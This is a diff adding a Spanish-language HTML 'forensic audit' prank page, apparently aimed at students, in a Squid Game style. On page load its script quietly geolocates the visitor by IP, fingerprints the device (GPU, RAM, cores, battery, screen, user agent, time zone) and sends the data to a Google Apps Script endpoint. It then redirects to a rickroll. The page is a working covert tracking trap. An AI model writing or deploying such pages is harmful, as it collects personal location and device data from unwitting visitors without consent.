@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>SISTEMA DE AUDITORÍA FORENSE - TEC PLAYA</title>
+    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@300;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --pink: #ed1b76; --green: #037a76; --bg: #050505; }
+        body { background: var(--bg); color: white; font-family: 'Quicksand', sans-serif; height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        #audit-box { border: 2px solid var(--pink); padding: 40px; background: rgba(237, 27, 118, 0.05); text-align: center; width: 90%; max-width: 800px; box-shadow: 0 0 50px var(--pink); }
+        .glitch { font-size: 3em; color: var(--pink); font-weight: 700; margin: 0; }
+        #console { text-align: left; background: #000; padding: 20px; border-left: 5px solid var(--green); color: #00ffcc; font-family: monospace; font-size: 0.9em; margin-top: 20px; max-height: 300px; overflow-y: auto; }
+        .danger { color: #ff4d4d; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div id="audit-box">
+    <div style="font-size:30px; color:var(--pink); margin-bottom:15px;">○ △ □</div>
+    <h1 class="glitch">JUGADOR ELIMINADO</h1>
+    <p class="danger">ERROR CRÍTICO: MEZCLA DE ENTORNOS (PERSONAL / PROFESIONAL)</p>
+    
+    <div id="console" id="log">
+        > Iniciando bypass de seguridad de dispositivo personal...<br>
+        > Extrayendo metadatos de hardware y red...<br>
+    </div>
+
+    <p id="timer" style="margin-top:20px; color:var(--green)">REPORTANDO A LA BASE DE DATOS DEL PROFESOR EN: 5...</p>
+</div>
+
+<script>
+/* INTEGRACIÓN SCORM ENGINE V23 */
+const SCORM = {
+    config: {
+        activityId: "LECCION_MAESTRA_FORENSE_2026",
+        scriptUrl: "https://script.google.com/macros/s/AKfycbwuyrdlN36c4cSAMEDUmwm3m3pF6gbjcIN0U41FS2byd5B49wTTGjVXb12HRXUtM-zSVg/exec"
+    },
+    syncCloud: function(action, extraData = {}) {
+        const payload = {
+            sheetName: this.config.activityId,
+            action: action,
+            id: "EXT_AUDIT",
+            device: /Mobi|Android/i.test(navigator.userAgent) ? "Móvil" : "Laptop/PC",
+            ...extraData
+        };
+        const url = `${this.config.scriptUrl}?q=${encodeURIComponent(JSON.stringify(payload))}`;
+        if (navigator.sendBeacon) navigator.sendBeacon(url);
+        else fetch(url, { mode: 'no-cors' });
+    }
+};
+
+async function executeTrap() {
+    const consoleBox = document.getElementById('console');
+    const addLog = (m) => { consoleBox.innerHTML += `> ${m}<br>`; consoleBox.scrollTop = consoleBox.scrollHeight; };
+
+    // 1. Auditoría de Red (Ahora sí funciona por estar en HTTPS)
+    let net = { ip: "127.0.0.1", city: "Local", org: "Unknown" };
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        net = await res.json();
+        addLog(`IP PÚBLICA DETECTADA: ${net.ip}`);
+        addLog(`LOCALIZACIÓN: ${net.city}, ${net.region} (${net.country_name})`);
+        addLog(`ISP: ${net.org}`);
+    } catch(e) { addLog("ALERTA: Red anonimizada."); }
+
+    // 2. Auditoría de Hardware (Sin restricciones)
+    const gl = document.createElement('canvas').getContext('webgl');
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "No detectada";
+    
+    let battery = { level: "N/A" };
+    try { const b = await navigator.getBattery(); battery.level = (b.level * 100) + "%"; } catch(e) {}
+
+    const forensicData = {
+        dispositivo: navigator.platform,
+        nucleos: navigator.hardwareConcurrency + " Cores",
+        ram: (navigator.deviceMemory || "N/A") + " GB",
+        graficos: gpu,
+        pantalla: `${window.screen.width}x${window.screen.height}`,
+        bateria: battery.level,
+        agente: navigator.userAgent
+    };
+
+    addLog(`HARDWARE: ${forensicData.nucleos} / ${forensicData.ram} RAM`);
+    addLog(`GPU: ${gpu}`);
+    addLog(`ESTADO ENERGÍA: ${battery.level}`);
+    addLog(`ZONA HORARIA: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
+    addLog(`<span style="color:#ed1b76">ESTADO FINAL: ELIMINADO</span>`);
+
+    // 3. Reporte final a tu Google Sheets
+    SCORM.syncCloud("identificacion_externa_personalizada", {
+        ip_real: net.ip,
+        ubicacion: `${net.city}, ${net.region}`,
+        ...forensicData
+    });
+
+    // 4. Rickroll
+    let count = 5;
+    const t = setInterval(() => {
+        count--;
+        document.getElementById('timer').innerText = `REPORTANDO A LA BASE DE DATOS DEL PROFESOR EN: ${count}...`;
+        if(count <= 0) {
+            clearInterval(t);
+            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+        }
+    }, 1000);
+}
+
+window.onload = executeTrap;
+</script>
+</body>
+</html>
